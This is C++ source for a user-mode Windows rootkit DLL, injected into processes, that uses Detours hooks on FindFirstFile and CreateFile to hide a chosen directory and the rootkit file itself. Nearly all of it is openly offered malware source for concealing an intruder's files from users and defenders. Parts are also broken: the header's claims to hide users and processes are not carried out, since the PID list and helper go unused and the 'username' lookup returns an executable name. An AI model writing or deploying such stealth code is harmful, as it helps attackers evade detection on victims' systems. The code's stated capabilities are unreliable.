/**
 * @file win_ring3_rootkit.cpp
 * @author Gris Iscomeback
 * @brief A Ring 3 Windows rootkit to hide users, processes, directories, and files.
 *
 * @details This rootkit intercepts various system calls to hide specific users,
 * processes, directories, and files. It is designed to be loaded using DLL injection.
 *
 * @compile cl /LD win_ring3_rootkit.cpp /link /DLL /OUT:win_ring3_rootkit.dll
 * @load Regsvr32 win_ring3_rootkit.dll
 *
 * @defines
 * HIDDEN_DIR "lazyown_atomic_test"
 * HIDDEN_FILE "win_ring3_rootkit.dll"
 * HIDE_USER "grisun0"
 * MAX_HIDE_PIDS 11
 *
 * @functions
 * get_username_from_pid(DWORD pid)
 * should_hide_pid(const char* pid)
 * hook_FindFirstFile(const char* path, WIN32_FIND_DATA* find_data)
 * hook_CreateFile(const char* path, DWORD access, DWORD share, LPSECURITY_ATTRIBUTES security, DWORD creation, DWORD flags, HANDLE template)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <detours.h>

#pragma comment(lib, "detours.lib")

#define HIDDEN_DIR "lazyown_atomic_test"
#define HIDDEN_FILE "win_ring3_rootkit.dll"
#define HIDE_USER "grisun0"
#define MAX_HIDE_PIDS 11

const char* hide_pids[MAX_HIDE_PIDS] = {
    "3061", "2398", "3102", "3109", "3110",
    "3112", "3204", "3218", "2822", "2823", "2705"
};

char* get_username_from_pid(DWORD pid) {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return NULL;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe)) {
        CloseHandle(hProcessSnap);
        return NULL;
    }

    do {
        if (pe.th32ProcessID == pid) {
            CloseHandle(hProcessSnap);
            return pe.szExeFile;
        }
    } while (Process32Next(hProcessSnap, &pe));

    CloseHandle(hProcessSnap);
    return NULL;
}

int should_hide_pid(const char* pid) {
    DWORD pid_num = atoi(pid);
    char* username = get_username_from_pid(pid_num);
    if (username && strcmp(username, HIDE_USER) == 0) {
        return 1;
    }
    return 0;
}

HANDLE (WINAPI *original_FindFirstFile)(CONST char*, WIN32_FIND_DATA*) = FindFirstFile;
HANDLE WINAPI hook_FindFirstFile(CONST char* path, WIN32_FIND_DATA* find_data) {
    if (strstr(path, HIDDEN_DIR) || strstr(path, HIDDEN_FILE)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE;
    }

    return original_FindFirstFile(path, find_data);
}

HANDLE (WINAPI *original_CreateFile)(CONST char*, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE) = CreateFile;
HANDLE WINAPI hook_CreateFile(CONST char* path, DWORD access, DWORD share, LPSECURITY_ATTRIBUTES security, DWORD creation, DWORD flags, HANDLE template) {
    if (strstr(path, HIDDEN_FILE)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE;
    }

    return original_CreateFile(path, access, share, security, creation, flags, template);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            DetourTransactionBegin();
            DetourUpdateThread(GetCurrentThread());
            DetourAttach(&(PVOID&)original_FindFirstFile, hook_FindFirstFile);
            DetourAttach(&(PVOID&)original_CreateFile, hook_CreateFile);
            DetourTransactionCommit();
            break;
        case DLL_PROCESS_DETACH:
            DetourTransactionBegin();
            DetourUpdateThread(GetCurrentThread());
            DetourDetach(&(PVOID&)original_FindFirstFile, hook_FindFirstFile);
            DetourDetach(&(PVOID&)original_CreateFile, hook_CreateFile);
            DetourTransactionCommit();
            break;
    }
    return TRUE;
}
